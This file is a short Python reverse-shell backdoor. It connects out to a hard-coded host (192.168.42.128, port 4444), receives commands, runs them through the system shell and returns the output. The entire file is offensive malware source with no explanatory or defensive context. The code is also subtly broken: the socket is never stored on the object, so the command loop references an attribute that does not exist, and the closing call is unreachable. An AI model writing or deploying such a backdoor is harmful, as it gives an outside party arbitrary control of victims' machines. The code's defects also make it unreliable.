import socket
import subprocess

class Backdoor:
    def __init__(self, ip, port):
        connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connection.connect((ip, port))        

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command.decode())
            self.connection.send(command_result)
        connection.close()
        
my_backdoor = Backdoor("192.168.42.128", 4444)
my_backdoor.run()